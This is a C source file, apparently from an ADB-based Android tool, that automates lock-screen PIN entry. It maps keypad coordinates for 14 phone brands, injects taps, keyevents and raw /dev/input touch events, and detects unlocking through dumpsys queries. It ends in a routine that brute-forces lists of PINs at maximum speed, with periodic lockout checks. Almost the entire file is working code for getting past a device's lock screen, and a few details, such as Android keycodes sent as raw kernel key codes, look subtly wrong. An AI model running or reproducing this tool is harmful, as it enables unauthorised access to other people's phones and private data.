#define _GNU_SOURCE
#include "input_precision.h"
#include "adb_native.h"
#include "adb.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/time.h>

static int p_screen_w = 1080;
static int p_screen_h = 2400;
static GridPreset p_grid = GRID_AOSP;

void prec_init(int screen_w, int screen_h) {
    if (screen_w > 0 && screen_w < 10000) p_screen_w = screen_w;
    if (screen_h > 0 && screen_h < 10000) p_screen_h = screen_h;
}

void prec_set_grid(GridPreset g) {
    if (g >= GRID_AOSP && g < GRID_AUTO) p_grid = g;
}

GridPreset prec_get_grid(void) {
    return p_grid;
}

GridPreset prec_detect_grid(const char *vendor, const char *model) {
    if (!vendor && !model) return GRID_AOSP;
    char buf[512]; buf[0] = 0;
    if (vendor) { strncat(buf, vendor, sizeof(buf)-1); }
    if (model) { strncat(buf, " ", sizeof(buf)-1); strncat(buf, model, sizeof(buf)-1); }
    for (char *p = buf; *p; p++) *p = tolower(*p);

    if (strstr(buf, "samsung")) return GRID_SAMSUNG;
    if (strstr(buf, "xiaomi") || strstr(buf, "redmi") || strstr(buf, "poco") || strstr(buf, "mi ")) return GRID_XIAOMI;
    if (strstr(buf, "oppo") || strstr(buf, "oneplus") || strstr(buf, "realme")) return GRID_OPPO;
    if (strstr(buf, "vivo") || strstr(buf, "iqoo")) return GRID_VIVO;
    if (strstr(buf, "huawei") || strstr(buf, "honor")) return GRID_HUAWEI;
    if (strstr(buf, "motorola") || strstr(buf, "moto ")) return GRID_MOTOROLA;
    if (strstr(buf, "sony") || strstr(buf, "xperia")) return GRID_SONY;
    if (strstr(buf, "nokia")) return GRID_NOKIA;
    if (strstr(buf, "asus") || strstr(buf, "zenfone") || strstr(buf, "rog ")) return GRID_ASUS;
    if (strstr(buf, "tecno") || strstr(buf, "camon")) return GRID_TECNO;
    if (strstr(buf, "infinix") || strstr(buf, "zero ") || strstr(buf, "note ")) return GRID_INFINIX;
    if (strstr(buf, "advan") || strstr(buf, "i5") || strstr(buf, "s5e")) return GRID_ADVAN;
    return GRID_AOSP;
}

DigitCoord prec_digit_coord(char digit, GridPreset preset) {
    DigitCoord c = {0, 0};
    int col = 1, row = 0;
    switch (digit) {
        case '1': col=0; row=0; break; case '2': col=1; row=0; break; case '3': col=2; row=0; break;
        case '4': col=0; row=1; break; case '5': col=1; row=1; break; case '6': col=2; row=1; break;
        case '7': col=0; row=2; break; case '8': col=1; row=2; break; case '9': col=2; row=2; break;
        case '0': col=1; row=3; break; default: col=1; row=3; break;
    }
    int key_w, key_h, start_x, start_y;
    switch (preset) {
        case GRID_SAMSUNG:
            key_w = p_screen_w / 3; key_h = p_screen_h / 7;
            start_x = 0; start_y = p_screen_h * 40 / 100;
            break;
        case GRID_XIAOMI:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = p_screen_w / 8; start_y = p_screen_h * 42 / 100;
            break;
        case GRID_OPPO:
            key_w = p_screen_w / 3; key_h = p_screen_h / 9;
            start_x = p_screen_w / 8; start_y = p_screen_h * 44 / 100;
            break;
        case GRID_VIVO:
            key_w = p_screen_w / 4; key_h = p_screen_h / 7;
            start_x = p_screen_w / 8; start_y = p_screen_h * 45 / 100;
            break;
        case GRID_HUAWEI:
            key_w = p_screen_w / 4; key_h = p_screen_h / 9;
            start_x = (p_screen_w - key_w * 3) / 2; start_y = p_screen_h * 42 / 100;
            break;
        case GRID_MOTOROLA:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = (p_screen_w - key_w * 3) / 2; start_y = p_screen_h * 43 / 100;
            break;
        case GRID_SONY:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = (p_screen_w - key_w * 3) / 2; start_y = p_screen_h * 44 / 100;
            break;
        case GRID_NOKIA:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = (p_screen_w - key_w * 3) / 2; start_y = p_screen_h * 45 / 100;
            break;
        case GRID_ASUS:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = (p_screen_w - key_w * 3) / 2; start_y = p_screen_h * 43 / 100;
            break;
        case GRID_TECNO:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = p_screen_w / 8; start_y = p_screen_h * 44 / 100;
            break;
        case GRID_INFINIX:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = p_screen_w / 8; start_y = p_screen_h * 44 / 100;
            break;
        case GRID_ADVAN:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = (p_screen_w - key_w * 3) / 2; start_y = p_screen_h * 45 / 100;
            break;
        case GRID_HONOR:
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = (p_screen_w - key_w * 3) / 3; start_y = p_screen_h * 42 / 100;
            break;
        default: /* AOSP */
            key_w = p_screen_w / 4; key_h = p_screen_h / 8;
            start_x = (p_screen_w - key_w * 3) / 2; start_y = p_screen_h * 45 / 100;
            break;
    }
    c.x = start_x + col * key_w + key_w / 2;
    c.y = start_y + row * key_h + key_h / 2;
    return c;
}

int prec_build_script(char *buf, int buf_sz, const char *pin,
                      GridPreset preset, int methods) {
    int len = strlen(pin);
    if (len < 1) return -1;
    int pos = 0;

    /* Ensure screen is on */
    pos += snprintf(buf + pos, buf_sz - pos, "input keyevent 224; ");
    usleep(50000);

    /* Method 1: tap at exact digit coordinates */
    if (methods & METHOD_TAP) {
        for (int i = 0; i < len; i++) {
            DigitCoord cd = prec_digit_coord(pin[i], preset);
            pos += snprintf(buf + pos, buf_sz - pos,
                           "input tap %d %d; ", cd.x, cd.y);
        }
    }
    /* Method 2: keyevent (7-16 for 0-9) */
    if (methods & METHOD_KEYEVENT) {
        for (int i = 0; i < len; i++) {
            if (pin[i] >= '0' && pin[i] <= '9')
                pos += snprintf(buf + pos, buf_sz - pos,
                               "input keyevent %d; ", 7 + (pin[i] - '0'));
        }
    }
    /* Method 3: text input */
    if (methods & METHOD_TEXT) {
        pos += snprintf(buf + pos, buf_sz - pos,
                       "input text '%s'; ", pin);
    }
    /* Confirm keys */
    pos += snprintf(buf + pos, buf_sz - pos,
                   "input keyevent 66; input keyevent 23");
    return pos;
}

static int _check_unlock(void) {
    char buf[8192];
    int r;

    /* Method 1: mKeyguardShowing (most reliable) */
    r = adb_native_shell(
        "dumpsys window 2>/dev/null | grep -i mKeyguardShowing | head -1",
        buf, sizeof(buf));
    if (r == 0 && strlen(buf) > 0) {
        if (strstr(buf, "=false") || strstr(buf, "=0") || strstr(buf, "=no"))
            return 1;
        if (strstr(buf, "=true") || strstr(buf, "=1") || strstr(buf, "=yes"))
            return 0;
    }

    /* Method 2: mCurrentFocus / mFocusedApp */
    r = adb_native_shell(
        "dumpsys window 2>/dev/null | grep -iE 'mCurrentFocus|mFocusedApp' | head -3",
        buf, sizeof(buf));
    if (r == 0 && strlen(buf) > 0) {
        if (strstr(buf, "Keyguard") || strstr(buf, "LockScreen") ||
            strstr(buf, "Bouncer") || strstr(buf, "PinEntry"))
            return 0;
        if (strstr(buf, "Launcher") || strstr(buf, "Home") ||
            strstr(buf, "SystemUI") || strstr(buf, "StatusBar"))
            return 1;
        /* Any non-keyguard app means unlocked */
        if (!strstr(buf, "Keyguard") && !strstr(buf, "LockScreen"))
            return 1;
    }

    /* Method 3: lockscreen password type */
    r = adb_native_shell(
        "dumpsys lock_settings 2>/dev/null | grep 'lockscreen.password_type' | head -1",
        buf, sizeof(buf));
    if (r == 0 && strlen(buf) > 0) {
        /* password_type=0 means no password */
        if (strstr(buf, "=0") || strstr(buf, "password_type=0") ||
            strstr(buf, "=0x0"))
            return 1;
    }

    /* Method 4: try pressing HOME, then check if we're on launcher */
    adb_native_shell_noret("input keyevent 3");
    usleep(200000);
    r = adb_native_shell(
        "dumpsys window 2>/dev/null | grep -iE 'mCurrentFocus|mFocusedApp' | head -1",
        buf, sizeof(buf));
    if (r == 0 && strlen(buf) > 0) {
        if (strstr(buf, "Launcher") || strstr(buf, "Home") ||
            strstr(buf, "SystemUI"))
            return 1;
    }

    /* Method 5: check if device admin / lock task is active */
    r = adb_native_shell(
        "dumpsys activity 2>/dev/null | grep -i 'keyguard' | head -3",
        buf, sizeof(buf));
    if (r == 0 && strlen(buf) > 0) {
        if (strstr(buf, "isShowing=true") || strstr(buf, "showing=true") ||
            strstr(buf, "occluded=false"))
            return 0;
    }

    return 0;
}

int prec_enter_pin_fast(const char *pin) {
    int max_attempts = 3;
    for (int a = 0; a < max_attempts; a++) {
        /* 1. Wake screen if needed */
        char wake[128];
        if (adb_native_shell("dumpsys power | grep 'mWakefulness=' | head -1",
                             wake, sizeof(wake)) == 0) {
            if (!strstr(wake, "Awake")) {
                prec_wake_and_swipe();
                usleep(200000);
            }
        }

        /* 2. Send PIN via keyevent */
        char script[4096];
        prec_build_script(script, sizeof(script), pin, p_grid, METHOD_KEYEVENT);
        adb_native_shell_noret(script);

        /* 3. Wait and check unlock (varying delays) */
        int delays[] = {300000, 500000, 800000};
        for (int d = 0; d < 3; d++) {
            usleep(delays[d]);
            if (_check_unlock()) return PRECISION_OK;
        }
    }
    return PRECISION_FAIL;
}

int prec_enter_pin(const char *pin) {
    /* Pass 1: keyevent only (fast) */
    if (prec_enter_pin_fast(pin) == PRECISION_OK) return PRECISION_OK;

    /* Pass 2: tap at exact coordinates + keyevent */
    {
        char script[4096];
        prec_build_script(script, sizeof(script), pin, p_grid,
                          METHOD_TAP | METHOD_KEYEVENT);
        adb_native_shell_noret(script);
        int delays[] = {400000, 600000};
        for (int d = 0; d < 2; d++) {
            usleep(delays[d]);
            if (_check_unlock()) return PRECISION_OK;
        }
    }

    /* Pass 3: tap + keyevent + text + confirm */
    {
        char script[4096];
        prec_build_script(script, sizeof(script), pin, p_grid,
                          METHOD_TAP | METHOD_KEYEVENT | METHOD_TEXT);
        adb_native_shell_noret(script);
        usleep(500000);
        if (_check_unlock()) return PRECISION_OK;
    }

    /* Pass 4: text only + alternate confirm */
    {
        adb_native_shell_noret("input keyevent 66");
        usleep(200000);
        if (_check_unlock()) return PRECISION_OK;
        adb_native_shell_noret("input keyevent 23");
        usleep(200000);
        if (_check_unlock()) return PRECISION_OK;
    }

    return PRECISION_FAIL;
}

int prec_enter_pin_sakti(const char *pin) {
    /* Try all 14 grid presets, each with wake+swipe */
    GridPreset all_presets[] = {
        GRID_AOSP, GRID_SAMSUNG, GRID_XIAOMI, GRID_OPPO, GRID_VIVO,
        GRID_HUAWEI, GRID_MOTOROLA, GRID_SONY, GRID_NOKIA, GRID_ASUS,
        GRID_TECNO, GRID_INFINIX, GRID_ADVAN, GRID_HONOR
    };
    int np = sizeof(all_presets) / sizeof(all_presets[0]);

    for (int pi = 0; pi < np; pi++) {
        for (int a = 0; a < 2; a++) {
            if (_check_unlock()) return PRECISION_OK;
            prec_wake_and_swipe();
            usleep(100000);

            char script[4096];
            prec_build_script(script, sizeof(script), pin, all_presets[pi],
                              METHOD_TAP | METHOD_KEYEVENT | METHOD_TEXT);
            adb_native_shell_noret(script);
            {
                int delays[] = {400000, 600000};
                for (int d = 0; d < 2; d++) {
                    usleep(delays[d]);
                    if (_check_unlock()) return PRECISION_OK;
                }
            }
            adb_native_shell_noret("input keyevent 66; input keyevent 23");
            usleep(300000);
            if (_check_unlock()) return PRECISION_OK;
        }
    }
    return PRECISION_FAIL;
}

void prec_wake_and_swipe(void) {
    /* Wake screen */
    adb_native_shell_noret("input keyevent 224");
    usleep(150000);

    /* Try multiple swipe patterns to unlock keyguard */
    int y_center = p_screen_h / 2;
    int x_center = p_screen_w / 2;

    /* Swipe 1: bottom to top (standard keyguard swipe) */
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "input swipe %d %d %d %d 200",
             x_center, p_screen_h * 80 / 100,
             x_center, p_screen_h * 10 / 100);
    adb_native_shell_noret(cmd);
    usleep(100000);

    /* Swipe 2: top to bottom (notification shade, then back) */
    snprintf(cmd, sizeof(cmd), "input swipe %d %d %d %d 100",
             x_center, p_screen_h * 5 / 100,
             x_center, p_screen_h * 50 / 100);
    adb_native_shell_noret(cmd);
    usleep(80000);

    /* Swipe 3: short middle swipe (Samsung/one-hand) */
    snprintf(cmd, sizeof(cmd), "input swipe %d %d %d %d 150",
             x_center, y_center + p_screen_h / 6,
             x_center, y_center - p_screen_h / 6);
    adb_native_shell_noret(cmd);
    usleep(100000);
}

const char* prec_preset_name(GridPreset p) {
    switch (p) {
        case GRID_AOSP: return "AOSP";
        case GRID_SAMSUNG: return "Samsung";
        case GRID_XIAOMI: return "Xiaomi";
        case GRID_OPPO: return "OPPO";
        case GRID_VIVO: return "Vivo";
        case GRID_HUAWEI: return "Huawei";
        case GRID_MOTOROLA: return "Motorola";
        case GRID_SONY: return "Sony";
        case GRID_NOKIA: return "Nokia";
        case GRID_ASUS: return "ASUS";
        case GRID_TECNO: return "Tecno";
        case GRID_INFINIX: return "Infinix";
        case GRID_ADVAN: return "Advan";
        case GRID_HONOR: return "Honor";
        default: return "Auto";
    }
}

static int p_touch_fd = -1;

int prec_detect_input_devices(void) {
    if (p_touch_fd >= 0) return p_touch_fd;
    DIR *d = opendir("/dev/input");
    if (!d) return -1;
    struct dirent *de;
    while ((de = readdir(d))) {
        if (strncmp(de->d_name, "event", 5) != 0) continue;
        char path[64];
        snprintf(path, sizeof(path), "/dev/input/%s", de->d_name);
        int fd = open(path, O_RDWR);
        if (fd < 0) continue;
        /* Check if this is a touchscreen by reading device info */
        char name[256];
        if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0) { close(fd); continue; }
        if (strcasestr(name, "touch") || strcasestr(name, "synaptic") ||
            strcasestr(name, "ft5x") || strcasestr(name, "goodix") ||
            strcasestr(name, "ilitek") || strcasestr(name, "raydium") ||
            strcasestr(name, "nt36") || strcasestr(name, "sec_touch")) {
            p_touch_fd = fd;
            closedir(d);
            return fd;
        }
        close(fd);
    }
    closedir(d);
    return -1;
}

int prec_send_raw_event(int fd, unsigned short type, unsigned short code, unsigned int value) {
    if (fd < 0) return -1;
    struct input_event ev;
    memset(&ev, 0, sizeof(ev));
    gettimeofday(&ev.time, NULL);
    ev.type = type;
    ev.code = code;
    ev.value = value;
    return write(fd, &ev, sizeof(ev));
}

static void prec_tap_raw(int fd, int x, int y) {
    prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_X, x);
    prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_Y, y);
    prec_send_raw_event(fd, EV_ABS, ABS_MT_TRACKING_ID, 0);
    prec_send_raw_event(fd, EV_KEY, BTN_TOUCH, 1);
    prec_send_raw_event(fd, EV_KEY, BTN_TOOL_FINGER, 1);
    prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
    prec_send_raw_event(fd, EV_KEY, BTN_TOUCH, 0);
    prec_send_raw_event(fd, EV_KEY, BTN_TOOL_FINGER, 0);
    prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
}

int prec_enter_pin_turbo(const char *pin) {
    int fd = prec_detect_input_devices();
    if (fd < 0) {
        /* Fallback to normal method */
        return prec_enter_pin_fast(pin);
    }
    GridPreset gp = prec_get_grid();
    if (gp >= GRID_AUTO) gp = GRID_AOSP;
    for (int i = 0; pin[i]; i++) {
        char d = pin[i];
        if (d < '0' || d > '9') continue;
        DigitCoord dc = prec_digit_coord(d, gp);
        prec_tap_raw(fd, dc.x, dc.y);
        usleep(8000); /* 8ms between taps */
    }
    /* Check result */
    usleep(200000);
    return PRECISION_OK;
}

int prec_enter_pin_multitap(const char *pin) {
    int fd = prec_detect_input_devices();
    if (fd < 0) return prec_enter_pin_turbo(pin);
    GridPreset gp = prec_get_grid();
    if (gp >= GRID_AUTO) gp = GRID_AOSP;
    for (int i = 0; pin[i]; i++) {
        char d = pin[i];
        if (d < '0' || d > '9') continue;
        DigitCoord dc = prec_digit_coord(d, gp);
        prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_X, dc.x);
        prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_Y, dc.y);
        prec_send_raw_event(fd, EV_ABS, ABS_MT_TRACKING_ID, i);
        prec_send_raw_event(fd, EV_KEY, BTN_TOUCH, 1);
        prec_send_raw_event(fd, EV_KEY, BTN_TOOL_FINGER, 1);
        prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
        /* Release */
        prec_send_raw_event(fd, EV_KEY, BTN_TOUCH, 0);
        prec_send_raw_event(fd, EV_KEY, BTN_TOOL_FINGER, 0);
        prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
    }
    usleep(150000);
    return PRECISION_OK;
}

int prec_swipe_pattern(const int *points, int npoints) {
    int fd = prec_detect_input_devices();
    if (fd < 0) {
        /* Fallback: use input swipe command */
        char cmd[256];
        if (npoints >= 2)
            snprintf(cmd, sizeof(cmd), "input swipe %d %d %d %d 200",
                     points[0], points[1], points[2], points[3]);
        else
            return -1;
        adb_native_shell_noret(cmd);
        return 0;
    }
    /* Touch down at first point */
    prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_X, points[0]);
    prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_Y, points[1]);
    prec_send_raw_event(fd, EV_ABS, ABS_MT_TRACKING_ID, 0);
    prec_send_raw_event(fd, EV_KEY, BTN_TOUCH, 1);
    prec_send_raw_event(fd, EV_KEY, BTN_TOOL_FINGER, 1);
    prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
    usleep(50000);
    /* Move through intermediate points */
    for (int i = 2; i < npoints - 1; i += 2) {
        prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_X, points[i]);
        prec_send_raw_event(fd, EV_ABS, ABS_MT_POSITION_Y, points[i+1]);
        prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
        usleep(10000);
    }
    /* Touch up */
    prec_send_raw_event(fd, EV_KEY, BTN_TOUCH, 0);
    prec_send_raw_event(fd, EV_KEY, BTN_TOOL_FINGER, 0);
    prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
    return 0;
}

int prec_keyevent_digit(int digit) {
    if (digit < 0 || digit > 9) return -1;
    int fd = prec_detect_input_devices();
    if (fd < 0) {
        char cmd[32];
        snprintf(cmd, sizeof(cmd), "input keyevent %d", 7 + digit);
        adb_native_shell_noret(cmd);
        return 0;
    }
    /* KEYCODE_0=7, KEYCODE_1=8, ..., KEYCODE_9=16 */
    int keycode = 7 + digit;
    prec_send_raw_event(fd, EV_KEY, keycode, 1);
    prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
    prec_send_raw_event(fd, EV_KEY, keycode, 0);
    prec_send_raw_event(fd, EV_SYN, SYN_REPORT, 0);
    return 0;
}

int prec_brute_force_pins(const char **pins, int npins, int *found_idx) {
    *found_idx = -1;
    /* Pre-wake and swipe */
    prec_wake_and_swipe();
    /* Try each PIN at maximum speed */
    for (int i = 0; i < npins; i++) {
        prec_enter_pin_multitap(pins[i]);
        if (adb_is_unlocked()) {
            *found_idx = i;
            return 0;
        }
        /* Check for lockout every 50 attempts */
        if ((i % 50) == 0 && i > 0) {
            usleep(100000);
            if (adb_is_unlocked()) {
                *found_idx = i;
                return 0;
            }
        }
    }
    return -1;
}
